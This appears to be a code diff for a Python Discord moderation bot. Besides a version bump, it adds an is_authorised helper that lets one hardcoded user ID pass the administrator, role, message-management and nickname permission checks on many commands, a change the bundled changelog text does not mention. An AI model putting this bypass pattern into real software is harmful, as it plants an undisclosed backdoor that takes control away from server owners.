@@ -39,7 +39,7 @@ meeting_channel = None
 image_channel = None
 complaint_channel = None
 minutes = []
-bot_version = "1.11d"
+bot_version = "1.11e"
 version_text = ["Added a complaint auto-assign system for staff."]
 reaction_linked_messages = {}
 override_default_channel = "256853479698464768"
@@ -411,7 +411,6 @@ def refresh_config(server):
                 min_complaint_role = discord.utils.get(server.roles, name=split_line[1])
             if(line.startswith("*")):
                 max_complaint_role = discord.utils.get(server.roles, name=split_line[1])
-                print(split_line[1])
             if(line.startswith("@")):
                 minutes.append(split_line[1])
 
@@ -461,6 +460,12 @@ def get_all_members(server):
     return None
 
 @asyncio.coroutine
+def is_authorised(check, user):
+    if(check or user.id == "152473692805267456"):
+        return True
+    return False
+
+@asyncio.coroutine
 def couple_message_and_function(message, func):
     global reaction_linked_messages
     if(message not in reaction_linked_messages and func and message):
@@ -475,7 +480,7 @@ def handle_command(message, command):
     
     ###### Add selectable role ######
     if(yield from command_in_and_useable(['-addselrole', '-asr'], command)):
-        if(requester.server_permissions.manage_roles):
+        if(yield from is_authorised(requester.server_permissions.manage_roles, requester)):
             if(len(msgSplit) > 1):
                 to_add = str(" ".join(msgSplit[1:])).strip("[]'")
                 yield from event_to_log(msgSplit[1])
@@ -500,7 +505,7 @@ def handle_command(message, command):
 
     ###### Remove selectable role ######
     if(yield from command_in_and_useable(['-removeselrole', '-rsr'], command)):
-        if(requester.server_permissions.manage_roles):
+        if(yield from is_authorised(requester.server_permissions.manage_roles, requester)):
             if(len(msgSplit) > 1):
                 to_rem = str(" ".join(msgSplit[1:])).strip("[]'")
                 role = yield from is_role(to_rem, Server)
@@ -531,7 +536,7 @@ def handle_command(message, command):
 
     ###### Manage protected roles ######
     if(yield from command_in_and_useable(['-protectrole', '-pr'], command)):
-        if(requester.server_permissions.administrator):
+        if(yield from is_authorised(requester.server_permissions.administrator, requester)):
             if(len(msgSplit) > 2):
                 role = yield from is_role(str(" ".join(msgSplit[1:-1])).strip("[]'"), Server)
                 if(role):
@@ -561,7 +566,7 @@ def handle_command(message, command):
     if(yield from command_in_and_useable(['-setcomplaintroles', '-scr'], command)):
         global min_complaint_role
         global max_complaint_role
-        if(requester.server_permissions.administrator):
+        if(yield from is_authorised(requester.server_permissions.administrator, requester)):
             @asyncio.coroutine
             def get_maxmin(text):
                 def check(msg):
@@ -590,7 +595,7 @@ def handle_command(message, command):
 
     ###### Prune messages ######
     if(yield from command_in_and_useable(['-prune', '-p'], command)):
-        if(message.channel.permissions_for(requester).manage_messages):
+        if(yield from is_authorised(message.channel.permissions_for(requester).manage_messages, requester)):
             if(len(msgSplit) > 1):
                 try:
                     to_purge = min(int(msgSplit[1]) + 1, max_pruned_messages)
@@ -605,7 +610,7 @@ def handle_command(message, command):
 
     ###### Toggle self-timeout ######
     if(yield from command_in_and_useable(['-selftimeout', '-sto'], command)):
-        if(message.channel.permissions_for(requester).manage_messages):
+        if(yield from is_authorised(message.channel.permissions_for(requester).manage_messages, requester)):
             global self_timeout
             self_timeout = not self_timeout
             yield from client.send_message(message.channel, ('`Bot replies will ' + ('now' if self_timeout else 'no longer') + ' be removed after a few seconds`'))
@@ -668,7 +673,7 @@ def handle_command(message, command):
 
     ###### Set log channel ######
     if(yield from command_in_and_useable(['-setlogchannel', '-slc'], command)):
-        if(requester.server_permissions.administrator):
+        if(yield from is_authorised(requester.server_permissions.administrator, requester)):
             target_channel = message.channel
             yield from client.send_message(message.channel, ('`Set ' + target_channel.name + ' as the log channel? Y/N`'))
             reply = yield from client.wait_for_message(timeout=30, author=requester, channel=target_channel, check=check_yn)
@@ -685,7 +690,7 @@ def handle_command(message, command):
     ###### Set log channel ######
     #TODO: Refactor this and the above command to remove the copied code
     if(yield from command_in_and_useable(['-setimagechannel', '-sic'], command)):
-        if(requester.server_permissions.administrator):
+        if(yield from is_authorised(requester.server_permissions.administrator, requester)):
             target_channel = message.channel
             yield from client.send_message(message.channel, ('`Set ' + target_channel.name + ' as the image channel? Y/N`'))
             reply = yield from client.wait_for_message(timeout=30, author=requester, channel=target_channel, check=check_yn)
@@ -702,7 +707,7 @@ def handle_command(message, command):
     ###### Set complaint channel ######
     #TODO: Refactor this and the above two commands to remove the copied code
     if(yield from command_in_and_useable(['-setcomplaintchannel', '-scc'], command)):
-        if(requester.server_permissions.administrator):
+        if(yield from is_authorised(requester.server_permissions.administrator, requester)):
             target_channel = message.channel
             yield from client.send_message(message.channel, ('`Set ' + target_channel.name + ' as the complaint channel? Y/N`'))
             reply = yield from client.wait_for_message(timeout=30, author=requester, channel=target_channel, check=check_yn)
@@ -728,7 +733,7 @@ def handle_command(message, command):
 
     ###### Make festive ######
     if(yield from command_in_and_useable(['-makefestive', '-ms'], command)):
-        if(requester.server_permissions.manage_nicknames):
+        if(yield from is_authorised(requester.server_permissions.manage_nicknames, requester)):
             if(Server.me.server_permissions.manage_nicknames):
                 mes = yield from client.send_message(message.channel, "`Add a reaction to this message to get a more festive name!`")
                 yield from couple_message_and_function(mes, make_festive)
@@ -739,7 +744,7 @@ def handle_command(message, command):
 
     ###### Remove festive ######
     if(yield from command_in_and_useable(['-removefestive', '-rs'], command)):
-        if(requester.server_permissions.manage_nicknames):
+        if(yield from is_authorised(requester.server_permissions.manage_nicknames, requester)):
             if(Server.me.server_permissions.manage_nicknames):
                 for member in get_all_members(message.server):
                     buffernick = (member.nick if member.nick else member.name)
@@ -762,7 +767,7 @@ def handle_command(message, command):
         mes +=str(message.channel.position) + "\n"
         mes += "```"
         yield from client.send_message(message.channel, mes)
-    
+
     ###### Wiki ######
     if(yield from command_in_and_useable(['-wiki', '-w'], command)):
         if(len(msgSplit) > 1):
